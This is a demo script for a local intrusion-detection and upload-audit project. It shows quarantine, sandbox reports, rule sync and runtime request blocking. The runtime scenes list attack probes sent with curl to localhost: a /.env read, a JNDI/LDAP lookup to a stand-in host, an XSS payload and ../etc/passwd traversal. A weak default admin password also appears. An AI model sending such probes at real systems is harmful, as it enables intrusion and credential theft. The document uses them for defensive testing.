# IDS Security Center Demo Script

## Demo Goal

Spec reference: `specs/010-ids-strict-ai-log-audit/`

Show one real end-to-end chain:

1. public upload is audit-gated (static mode without key, AI-enhanced mode with key),
2. benign content is accepted,
3. suspicious content is withheld into the sandbox,
4. the sandbox can reopen and deepen the report,
5. the resulting sample appears as a real IDS incident on the situation page,
6. the bootstrapped external static rules can hard-block a malicious request with `403`.

## Demo Setup

- Preferred on Windows: run `start-ids-dev.bat` from the repo root, or run
  `powershell -ExecutionPolicy Bypass -File .\start-ids-dev.ps1`.
- The quick-start launcher opens backend and frontend in separate windows,
  asks for the AI launch mode before opening the backend window, auto-picks
  backend port `8166` or `8167`, and initializes `backend/supply_chain.db` if
  it does not exist yet.
- Quick start also writes `.ids-dev-processes.json` so `stop-ids-dev.bat` /
  `powershell -ExecutionPolicy Bypass -File .\stop-ids-dev.ps1` can close the
  exact demo windows and child processes after the session.
- Backend running on `127.0.0.1:8166` or `127.0.0.1:8167`
- Frontend running on `127.0.0.1:5173` or `127.0.0.1:5174`
- Admin account ready: `system_admin / 123456`
- Three tabs ready:
  - `/upload`
  - `/security/log-audit`
  - `/security/sandbox`
  - `/security/ids`
  - `/security/situation`
- Demo files ready:
  - `tmp/codex-note.txt`
  - `tmp/codex-webshell.php`

## Scene 0 - Startup Mode Selection (Static / AI)

**Action**

- Preferred for demos: launch the stack with `start-ids-dev.bat`.
- Start the backend via `python init_db.py` / `uvicorn app.main:app --reload --host 127.0.0.1 --port 8166`.
- If `8166` is occupied on the demo machine, switch to `8167` and keep the front-end on the same backend base URL.
- In quick start, answer the launcher prompt asking whether to enable AI mode now.
- If you choose `yes`, select `deepseek` or `kimi`, paste the API key, and let the system auto-fill the base URL plus default model name.
- If you choose `no`, continue in static audit mode immediately.

**What To Say**

- Highlight this prompt as an explicit mode switch, not a hidden behavior:
  - no key/config => static audit mode (heuristic + indicator-based),
  - key/config ready => AI-enhanced audit mode (LLM + static guardrail).
- Emphasize that both modes are real and auditable, and the response payload marks `analysis_mode` clearly.

**Expected Result**

- Backend startup logs and `/api/health` show whether AI is configured.
- Uploads work in both modes, and the audit result exposes the active mode.

## Scene 1 - Explain The New Upload Gate

**Action**

- Open `/upload`
- Point at the page copy that explains "static or AI-enhanced audit before release".

**What To Say**

“现在匿名上传不是直接落盘了，所有文件都会先经过审计。没配置密钥时走静态审计，配置后自动启用 AI 增强审计。通过的文件进入公开放行区，不通过的文件直接扣留到安全沙箱。”

**Expected Result**

- The page clearly explains the gate.
- The operator can see this is no longer a frontend-only warning.

## Scene 2 - Upload A Benign File

**Action**

- Upload `tmp/codex-note.txt`

**What To Say**

“我们先看正常路径。低风险文本不会被误杀，系统会给出放行结论，并返回公开访问地址。”

**Expected Result**

- The UI shows an accepted result.
- The audit summary shows a low-risk/pass decision.
- A public file URL is returned.
- The file does not appear in the sandbox.

## Scene 3 - Upload A Suspicious File

**Action**

- Upload `tmp/codex-webshell.php`

**What To Say**

“再看可疑路径。这个样本包含典型 WebShell 信号，所以不会被公开放行，而是直接被上传审计链路扣留；如果当前启用了密钥，这里会显示 AI 增强审计，否则会明确显示静态审计模式。”

**Expected Result**

- The UI shows a withheld result.
- The page stays in the quarantined state only; it should not also show a fake
  `上传审计执行失败 / 网络错误` panel for the same upload.
- The dialog shows verdict, risk level, and confidence.
- The upload result explains why the file was held and whether the verdict came
  from `static_only` or `llm_assisted` mode.
- No public accepted-file URL is returned.

## Scene 4 - Show The Sandbox

**Action**

- Switch to `/security/sandbox`
- Find the new quarantined sample
- Open the report or trigger the analyze action

**What To Say**

“安全沙箱现在读的是后端真实样本和真实报告，不再是前端临时拼出来的演示行。这里能直接看到审计结论、证据、哈希和静态分析结果。”

**Expected Result**

- The sample is present in the quarantine table.
- The row shows verdict, risk, confidence, summary, and current analysis mode.
- The report drawer shows `Why This File Was Held`, SHA-256, matched indicators
  with detail, analysis mode, provider, and all recommended actions.

## Scene 5 - Review The IDS Log Audit Feed

**Action**

- Open `/security/log-audit`.
- Filter for the recent `ids_upload_quarantine` or `ids_upload_release` action and the target file, or search by `saved_as`.

**What To Say**

- Point out that every upload decision, source sync, or status change now emits a log entry that records the user, action, and timestamp so nothing is hidden in a demo stub.
- Emphasize that you can see the same `save_as` sample and its audit mode/verdict there, which proves the system is real and auditable.

**Expected Result**

- The log table shows the upload gate entry, including the operator and the `upload_trace` target, along with follow-up sandbox or IDS actions such as `ids_sandbox_analyze`.
- Filtering the feed highlights the quarantined sample, proving the audit trail matches the uploaded file from Scene 3.

## Scene 6 - Show IDS Event Evidence And Jump Back To Sandbox

**Action**

- Switch to `/security/ids`
- Open the latest malware / upload-gate incident
- Point at the new `Upload Audit Trace` block
- Click `打开沙箱报告`

**What To Say**

“这一步把原来分散的页面真正串起来了。现在 IDS 事件详情里不只是看到一条告警，而是能直接看到上传样本编号、哈希、审计模式和审计结论，再一键跳回对应的沙箱报告。”

**Expected Result**

- The IDS event drawer shows `Upload Audit Trace`.
- The drawer shows `saved_as`, original filename, SHA-256, and audit summary.
- Clicking `打开沙箱报告` opens the exact quarantined sample report in
  `/security/sandbox`.

## Scene 7 - Show IDS Situation Linkage

**Action**

- Switch to `/security/situation`

**What To Say**

“被扣留的上传不只是停在沙箱里，它还会生成真实的 IDS 事件。所以态势页里能看到同一条链路对应的实时告警、阻断统计和最近事件。”
- Mention that this screen is purely observational for the slice and was left untouched, reinforcing that the new content lives inside the upload/log-audit flows.

**Expected Result**

- Counters refresh from backend data.
- The recent incident feed contains the malware/WebShell event.
- The map disclaimer states that locations are derived from incident IPs.

## Scene 8 - Close The Loop

**Action**

- Return to `/security/sandbox`
- Mention delete/preserve options and refresh-safe report reopening

**What To Say**

“这条链路已经把上传、审计、隔离、分析、事件和态势串起来了。现在这个 IDS 演示不只是前端效果，而是接近真实的安全处置闭环。”

**Expected Result**

- The audience sees one coherent workflow instead of disconnected demo pages.
- After the demo, run `stop-ids-dev.bat` so the quick-started frontend/backend
  windows and their child processes are closed together.

## Backup Talking Points

- Safe files still work, the system is not blocking everything.
- Format-aware audit now distinguishes real document/image containers from suspicious binary payloads, so normal `docx/png/pdf` uploads are not blocked just because they are binary files.
- `review` and `quarantine` both enter the sandbox, so operators can hold and
  inspect suspicious uploads before release.
- The request-side IDS matcher is now real too. Baseline SQLi/XSS/path-traversal/command-injection probes are scored by the in-process engine, while activated trusted `web` rule packages can add runtime matches with source attribution.
- The situation page is driven by real incidents, but the map positions are
  approximate derived visualization, not exact geo-IP intelligence.
- The Security IDS page no longer exposes hidden demo triggers, and the
  Security Situation page remains the only observational visualization slice.

## Demo Extension - Real IDS Source Sync

### Setup

- Keep the same stack and admin account from the main demo.
- Ensure the IDS source fixture exists:
  - `backend/app/data/ids_source_sync/suricata-web-prod.manifest.json`
  - `backend/app/data/ids_source_sync/suricata-web-prod.rules`
- Open `/security/ids`.

### Scene 7 - Show That Rule Source Sync Is No Longer A Stub

**Action**

- Point at the `Suricata Web Prod` row.
- Highlight the visible sync endpoint path in the source column.

**What To Say**

“这块以前更像状态牌，现在每个真正可同步的规则源都带着可执行的 `sync_endpoint`。也就是说安全中心看到的不再只是说明文字，而是一个真实会去读取 manifest 的同步目标。”

**Expected Result**

- The row shows `app/data/ids_source_sync/suricata-web-prod.manifest.json`.
- The latest sync section shows a real package version and resolved manifest path.

### Scene 8 - Trigger One More Real Sync

**Action**

- Click `执行同步`.

**What To Say**

“我现在手动触发一次规则源同步。后端会实际读取本地 manifest 和规则文件，算出版本、规则条数、文件大小和 SHA-256，而不是像以前那样只把状态改成成功。”

**Expected Result**

- The row updates to a fresh successful sync time.
- The latest sync detail references the manifest and rule artifact.
- The package preview area shows the refreshed ET Open-derived rule count and the shortened SHA-256.

### Scene 9 - Open History And Show Sync Audit

**Action**

- Click `历史`.

**What To Say**

“历史弹窗现在不只是看规则包了，还能看到同步审计本身。这里能把谁触发的、读了哪个 manifest、导入了哪个版本、结果是什么，一次性串起来。”

**Expected Result**

- `Sync Audit` shows the latest result, timestamp, operator, detail, and manifest path.
- Package intake history shows the same `2026.04.07` package plus the persisted intake detail.

## Demo Extension - Runtime Request Matching

### Setup

- Keep `/security/ids` open on the latest incident list.
- Make sure the `suricata-web-prod` package is already activated from the source-sync demo extension.

### Scene 10 - Show That Runtime Matching Is No Longer Inline-only

**Action**

- Visit one of these runtime probes:
  - `GET /.env`
  - `GET /login?user=${jndi:ldap://demo/a}`
  - `GET /proxy.php?url=<script>alert(1)</script>`
- Return to `/security/ids` and open the newest event.

**What To Say**

“这里不是只做上传审计。运行时请求本身也会经过 IDS 匹配。现在激活的是从官方 ET Open 规则包同步下来的静态规则集，所以这条事件会明确标注命中的规则源、版本和规则 ID，而且事件详情里能直接看到攻击包和静态证据链。”

**Expected Result**

- The request is blocked with HTTP `403`.
- The newest IDS event is attributed to the activated `suricata-web-prod` package.
- The event shows `detector_name=suricata-web-prod`, the imported package version, the matched `sid`, an `Attack Packet` block, and the matched static-rule chain.
- If AI is configured, the same blocked event also shows an `AI Analysis` block; if not, the report explicitly stays in static mode.

### Source Sync Talking Points

- This slice keeps sync local and reproducible first, not network-heavy.
- `scheduled` still means scheduler-managed metadata; this demo focuses on making
  the manual sync path real and reviewable.
- The same source row now carries enough context for review: sync endpoint,
  package version, rule count, shortened hash, and audit history.

## Demo Extension - Activated Package Enters Runtime IDS

### Setup

- Finish the real source sync flow above and make sure the latest
  `suricata-web-prod` package is activated.
- Keep `/security/ids` open.
- Keep a terminal ready for:
  - `curl "http://127.0.0.1:8166/.env"`
  - `curl "http://127.0.0.1:8166/login?user=%24%7Bjndi%3Aldap%3A%2F%2Fdemo%2Fa%7D"`
  - `curl --path-as-is "http://127.0.0.1:8166/proxy.php?url=%3Cscript%3Ealert(1)%3C%2Fscript%3E"`
  - or replace `8166` with `8167` if quick start selected the alternate backend port

### Scene 10 - Explain The Last Closed Loop

**Action**

- Point at the active package version on the `Suricata Web Prod` row.

**What To Say**

“现在补上的不是又一个状态字段，而是最后这段闭环。激活后的 `web` 规则包会进入运行时检测缓存，后面命中的事件会直接带真实规则源、版本、规则 ID 和攻击包证据链。”

**Expected Result**

- The row shows an active package version for `suricata-web-prod`.
- The audience understands activation now affects runtime detection, not only history records.

### Scene 11 - Fire One Runtime Probe

**Action**

- Run `curl "http://127.0.0.1:8166/runtime-probe?sample=../etc/passwd"` or `curl "http://127.0.0.1:8167/runtime-probe?sample=../etc/passwd"`.

**What To Say**

“这里我发一个真实的恶意探针。现在它不会只是记录一条事件，而是会被启用的 ET Open 静态规则包真正拦截，直接返回 403。”

**Expected Result**

- The request returns HTTP `403`.
- A new IDS event is recorded with the matched-rule chain and block score.

### Scene 12 - Show Runtime Provenance

**Action**

- Refresh the IDS event list or open the latest event details.

**What To Say**

“关键点不是有没有再弹一个提示，而是事件来源变了。现在这里能看到 `suricata-web-prod`、包版本 `2026.04.07`、命中的规则 id、攻击包预览，以及是否走到 AI 研判。”

**Expected Result**

- The latest IDS event shows `detector_name=suricata-web-prod`.
- The event shows `source_version=2026.04.07`.
- The event shows the matched `source_rule_id`, the `Attack Packet` block, the block score vs threshold, and the optional AI analysis mode.

### Runtime Activation Talking Points

- This is a lightweight runtime bridge for activated `web` artifacts, not a full Suricata execution engine.
- 在当前本地演示里，启动阶段会自动引导并激活 `suricata-web-prod`，所以请求侧展示的就是外部规则包命中链，而不是空规则状态。
- `scheduled` sync automation and non-`web` runtime execution remain later work.
